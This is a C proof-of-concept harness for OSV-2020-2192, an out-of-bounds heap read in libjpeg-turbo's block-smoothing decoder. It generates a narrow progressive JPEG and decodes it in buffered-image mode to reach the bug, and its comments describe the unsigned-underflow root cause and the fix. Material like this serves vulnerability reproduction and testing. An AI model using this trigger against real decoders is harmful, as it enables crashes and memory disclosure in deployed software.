/*
 * Harness for OSV-2020-2192: heap-buffer-overflow in decompress_smooth_data
 *
 * Vulnerability: In decompress_smooth_data() (jdcoefct.c), last_block_column
 * is an unsigned int computed as (compptr->width_in_blocks - 1).  When
 * width_in_blocks == 1 (e.g., a 4:4:4 progressive JPEG of width <= 8 pixels),
 * last_block_column == 0.  The comparison at line 590:
 *
 *     if (block_num < last_block_column - 1)
 *
 * wraps to (block_num < 0xFFFFFFFF), which always passes.  The code then
 * accesses buffer_ptr[2][0] -- a second block column that does not exist --
 * producing a heap-buffer-overflow read.
 *
 * Fix (commit ccaba5d): Changed the comparison to:
 *     if (block_num + 1 < last_block_column)
 *
 * Trigger strategy:
 *   decompress_smooth_data is only called when do_block_smoothing is on AND
 *   smoothing_ok() returns TRUE, which requires some AC coef_bits to be
 *   non-zero (i.e., partially refined).  This happens during buffered-image
 *   mode output when not all progressive scans have been consumed yet.
 *
 *   We create a narrow 8x32 progressive JPEG (4:4:4), then decompress it in
 *   buffered-image mode: consume just the first scan (DC only), then request
 *   output.  At that point the AC coefficients are known to be partially
 *   refined (coef_bits != 0), so smoothing_ok returns TRUE and
 *   decompress_smooth_data is invoked, hitting the OOB.
 *
 * Build:
 *   See build.sh -- this must be statically linked against the vulnerable
 *   libjpeg-turbo (commit cfc7e6e5).
 *
 * Run:
 *   ./poc_harness              # self-contained, no input file needed
 *   ./poc_harness poc_input.bin # or feed a pre-built narrow progressive JPEG
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <jpeglib.h>

/* ---- Error handler that longjmps instead of calling exit() ---- */

struct my_error_mgr {
    struct jpeg_error_mgr pub;
    jmp_buf setjmp_buffer;
};

static void my_error_exit(j_common_ptr cinfo)
{
    struct my_error_mgr *myerr = (struct my_error_mgr *)cinfo->err;
    (*cinfo->err->output_message)(cinfo);
    longjmp(myerr->setjmp_buffer, 1);
}

/*
 * compress_narrow_progressive_jpeg
 *
 * Creates a narrow progressive JPEG in memory:
 *   - 8x32 pixel, 3-component (YCbCr), 4:4:4 subsampling
 *   - Progressive mode via jpeg_simple_progression()
 *
 * With width=8 and 4:4:4, each component has width_in_blocks=1, so
 * last_block_column will be 0 in decompress_smooth_data.
 * The 32-pixel height gives 4 MCU rows, ensuring the middle rows
 * hit the vulnerable code path without triggering array bounds errors
 * from the smoothing filter's vertical neighborhood access.
 *
 * Returns the JPEG data and its size through out parameters.
 * Caller must free *out_buf.
 */
static int compress_narrow_progressive_jpeg(unsigned char **out_buf,
                                            unsigned long *out_size)
{
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    unsigned char *jpeg_buf = NULL;
    unsigned long jpeg_size = 0;

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    /* Direct output to memory */
    jpeg_mem_dest(&cinfo, &jpeg_buf, &jpeg_size);

    /*
     * Width must be <= 8 for 4:4:4 to get width_in_blocks=1.
     * Height must be >= 24 pixels (3 MCU rows of 8 lines each) so that
     * decompress_smooth_data doesn't hit a separate "Bogus virtual array
     * access" error when requesting neighboring iMCU rows for smoothing.
     */
    cinfo.image_width = 8;       /* 8 pixels wide -> width_in_blocks = 1 */
    cinfo.image_height = 32;     /* 4 MCU rows -- inner rows hit line 590 */
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);

    /* Force 4:4:4 subsampling (h_samp_factor=1, v_samp_factor=1 for all) */
    cinfo.comp_info[0].h_samp_factor = 1;
    cinfo.comp_info[0].v_samp_factor = 1;
    cinfo.comp_info[1].h_samp_factor = 1;
    cinfo.comp_info[1].v_samp_factor = 1;
    cinfo.comp_info[2].h_samp_factor = 1;
    cinfo.comp_info[2].v_samp_factor = 1;

    /* Enable progressive mode -- required to reach decompress_smooth_data */
    jpeg_simple_progression(&cinfo);

    jpeg_start_compress(&cinfo, TRUE);

    /* Write scanlines: 8x32 pixels, varying color for non-zero AC content */
    unsigned char row[8 * 3];
    JSAMPROW row_ptr = row;
    int y;
    for (y = 0; y < 32; y++) {
        int x;
        for (x = 0; x < 8; x++) {
            row[x * 3 + 0] = (unsigned char)((x * 37 + y * 13) & 0xFF);
            row[x * 3 + 1] = (unsigned char)((x * 59 + y * 41) & 0xFF);
            row[x * 3 + 2] = (unsigned char)((x * 97 + y * 71) & 0xFF);
        }
        jpeg_write_scanlines(&cinfo, &row_ptr, 1);
    }

    jpeg_finish_compress(&cinfo);
    jpeg_destroy_compress(&cinfo);

    *out_buf = jpeg_buf;
    *out_size = jpeg_size;
    return 0;
}

/*
 * decompress_jpeg_buffered
 *
 * Decompresses a progressive JPEG using buffered-image mode.
 *
 * The key: we consume only the first scan (DC coefficients), then
 * start output.  At this point smoothing_ok() sees non-zero coef_bits
 * for AC coefficients (they haven't been decoded yet), so it returns
 * TRUE and the decompressor uses decompress_smooth_data().
 *
 * With width_in_blocks=1, last_block_column=0, and the unsigned
 * underflow at line 590 causes an OOB read.
 *
 * Returns 0 on success, non-zero on error.
 */
static int decompress_jpeg_buffered(const unsigned char *jpeg_buf,
                                    unsigned long jpeg_size)
{
    struct jpeg_decompress_struct dinfo;
    struct my_error_mgr jerr;
    int retval = 0;

    dinfo.err = jpeg_std_error(&jerr.pub);
    jerr.pub.error_exit = my_error_exit;

    if (setjmp(jerr.setjmp_buffer)) {
        fprintf(stderr, "[harness] libjpeg error caught\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    jpeg_create_decompress(&dinfo);
    jpeg_mem_src(&dinfo, jpeg_buf, jpeg_size);

    if (jpeg_read_header(&dinfo, TRUE) != JPEG_HEADER_OK) {
        fprintf(stderr, "[harness] jpeg_read_header failed\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    fprintf(stderr, "[harness] Image: %ux%u, %d components, progressive=%d\n",
            dinfo.image_width, dinfo.image_height,
            dinfo.num_components, dinfo.progressive_mode);

    if (!dinfo.progressive_mode) {
        fprintf(stderr, "[harness] Error: image is not progressive\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    /* Enable buffered-image mode so we can control scan consumption */
    dinfo.buffered_image = TRUE;
    dinfo.do_block_smoothing = TRUE;

    /* Start decompression in buffered-image mode */
    if (!jpeg_start_decompress(&dinfo)) {
        fprintf(stderr, "[harness] jpeg_start_decompress failed\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    fprintf(stderr, "[harness] Buffered-image mode: consuming scans...\n");

    /*
     * Consume input until at least one scan is available.
     * We do NOT consume all scans -- we stop after consuming enough to
     * have DC data, leaving AC coefficients partially refined.
     * This causes smoothing_ok() to return TRUE.
     */
    int consume_status;
    do {
        consume_status = jpeg_consume_input(&dinfo);
    } while (consume_status != JPEG_REACHED_SOS &&
             consume_status != JPEG_REACHED_EOI);

    fprintf(stderr, "[harness] After first scan: input_scan_number=%d, "
                    "consume_status=%d\n",
            dinfo.input_scan_number, consume_status);

    /*
     * Now request output from the partially-decoded data.
     * jpeg_start_output calls start_output_pass, which checks
     * smoothing_ok().  Because AC coefficients are still partially
     * refined, smoothing_ok returns TRUE, and decompress_smooth_data
     * is installed as the decompress method.
     */
    if (!jpeg_start_output(&dinfo, dinfo.input_scan_number)) {
        fprintf(stderr, "[harness] jpeg_start_output failed\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    fprintf(stderr, "[harness] Output started at scan %d "
                    "(decompress_smooth_data should be active)\n",
            dinfo.input_scan_number);

    /* Read all scanlines -- decompress_smooth_data is called here.
     * This is where the OOB read happens. */
    int row_stride = dinfo.output_width * dinfo.output_components;
    unsigned char *scanline_buf = (unsigned char *)malloc(row_stride);
    if (!scanline_buf) {
        fprintf(stderr, "[harness] malloc failed\n");
        jpeg_destroy_decompress(&dinfo);
        return 1;
    }

    JSAMPROW row_ptr = scanline_buf;
    while (dinfo.output_scanline < dinfo.output_height) {
        jpeg_read_scanlines(&dinfo, &row_ptr, 1);
    }

    fprintf(stderr, "[harness] Scanline read complete: %ux%u output\n",
            dinfo.output_width, dinfo.output_height);

    jpeg_finish_output(&dinfo);

    /* Drain remaining scans to allow clean shutdown */
    while (!jpeg_input_complete(&dinfo)) {
        do {
            consume_status = jpeg_consume_input(&dinfo);
        } while (consume_status != JPEG_REACHED_SOS &&
                 consume_status != JPEG_REACHED_EOI);

        if (consume_status == JPEG_REACHED_EOI)
            break;
    }

    jpeg_finish_decompress(&dinfo);
    jpeg_destroy_decompress(&dinfo);
    free(scanline_buf);

    return retval;
}

/*
 * save_jpeg_to_file
 *
 * Writes the generated JPEG to disk as poc_input.bin for reproducibility.
 */
static void save_jpeg_to_file(const unsigned char *buf, unsigned long size,
                              const char *path)
{
    FILE *f = fopen(path, "wb");
    if (!f) {
        fprintf(stderr, "[harness] Warning: could not save %s\n", path);
        return;
    }
    fwrite(buf, 1, size, f);
    fclose(f);
    fprintf(stderr, "[harness] Saved %lu-byte JPEG to %s\n", size, path);
}

/*
 * load_jpeg_from_file
 *
 * Reads a JPEG from disk into a malloc'd buffer.
 * Returns 0 on success.
 */
static int load_jpeg_from_file(const char *path, unsigned char **out_buf,
                               unsigned long *out_size)
{
    FILE *f = fopen(path, "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (len <= 0) { fclose(f); return 1; }

    unsigned char *buf = (unsigned char *)malloc(len);
    if (!buf) { fclose(f); return 1; }

    if ((long)fread(buf, 1, len, f) != len) {
        free(buf);
        fclose(f);
        return 1;
    }
    fclose(f);

    *out_buf = buf;
    *out_size = (unsigned long)len;
    return 0;
}

int main(int argc, char *argv[])
{
    unsigned char *jpeg_buf = NULL;
    unsigned long jpeg_size = 0;

    fprintf(stderr, "=== OSV-2020-2192 PoC ===\n");
    fprintf(stderr, "heap-buffer-overflow in decompress_smooth_data (jdcoefct.c)\n");
    fprintf(stderr, "Unsigned underflow: last_block_column=0, "
                    "(last_block_column - 1) wraps to 0xFFFFFFFF\n\n");

    if (argc >= 2) {
        /* Mode 1: Load JPEG from file */
        fprintf(stderr, "[harness] Loading JPEG from %s\n", argv[1]);
        if (load_jpeg_from_file(argv[1], &jpeg_buf, &jpeg_size) != 0) {
            fprintf(stderr, "[harness] Error: cannot read %s\n", argv[1]);
            return 1;
        }
    } else {
        /* Mode 2: Generate a narrow progressive JPEG in memory */
        fprintf(stderr, "[harness] Generating 8x32 progressive JPEG (4:4:4)...\n");
        if (compress_narrow_progressive_jpeg(&jpeg_buf, &jpeg_size) != 0) {
            fprintf(stderr, "[harness] Error: JPEG generation failed\n");
            return 1;
        }
        fprintf(stderr, "[harness] Generated %lu-byte progressive JPEG\n",
                jpeg_size);

        /* Save for reproducibility */
        save_jpeg_to_file(jpeg_buf, jpeg_size, "poc_input.bin");
    }

    fprintf(stderr, "[harness] Decompressing in buffered-image mode...\n");
    fprintf(stderr, "[harness] (Only first scan consumed => smoothing_ok=TRUE "
                    "=> decompress_smooth_data triggered)\n\n");
    int rc = decompress_jpeg_buffered(jpeg_buf, jpeg_size);

    if (rc == 0) {
        fprintf(stderr, "\n[harness] Decompression returned successfully.\n");
        fprintf(stderr, "[harness] On the VULNERABLE version, the OOB read occurred\n");
        fprintf(stderr, "[harness] silently (or crashes under ASan/Valgrind).\n");
        fprintf(stderr, "[harness] Run under ASan or Valgrind to observe the bug:\n");
        fprintf(stderr, "  valgrind ./poc_harness\n");
    } else {
        fprintf(stderr, "\n[harness] Decompression failed (rc=%d)\n", rc);
    }

    free(jpeg_buf);
    return rc;
}
